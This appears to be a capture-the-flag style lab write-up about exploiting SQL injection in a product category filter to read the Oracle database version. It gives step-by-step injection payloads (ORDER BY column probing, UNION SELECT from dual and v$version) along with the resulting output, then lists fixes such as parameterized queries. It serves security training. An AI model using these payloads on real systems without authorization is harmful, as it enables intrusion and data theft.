# Lab: SQL injection attack, querying the database type and version on Oracle

**Category:** SQL Injection\
**Difficulty:** Practitioner\
**Objective:** Display the database version string.

## 0. Attacker mindset

The product category filter is vulnerable to SQL injection. To extract the database version on Oracle, a UNION attack is needed. Oracle requires the `FROM dual` clause for queries that dont select from a real table, and the version information is stored in the `v$version` system table.

## 1. What is the vulnerability?

The application concatenates the `category` parameter directly into a SQL query without sanitization. An attacker can inject a `UNION SELECT` to retrieve data from other tables. On Oracle databases, the version details are accessible via the `v$version` view, which contains multiple rows with version information for different components.

## 2. How did I exploit it?

### Step 1 - Determine the number of columns

Used `ORDER BY` to find the column count:
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 -- (error)
```

The query returns **2 columns.**

### Step 2 - Find which column accepts string

Testes `UNION SELECT` with string literals:
```
' UNION SELECT 'abc',NULL FROM dual --
```

String `abc` appeared in the response -> first column accepts strings.

### Step 3 - Extract the database version

Retrieved all version information from `v$version`:

```
GET /filter?category=Gifts' UNION SELECT banner, NULL FROM v$version --
```

The response displayed the complete Oracle version string:
`Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`

The lab solved automatically when the version appeared in the response.

## 3. Impact

- Attacker can identify the exact database type and version
- Version information enables targeted exploitation of known database vulnerabilities
- Confirms the injection point can extract arbitrary data from system tables

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) for all database access
- Validate user input against a whitelist of allowed values
- Restrict the database account's privileges (revoke access to a system tables like `v$version` if not needed)

---

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)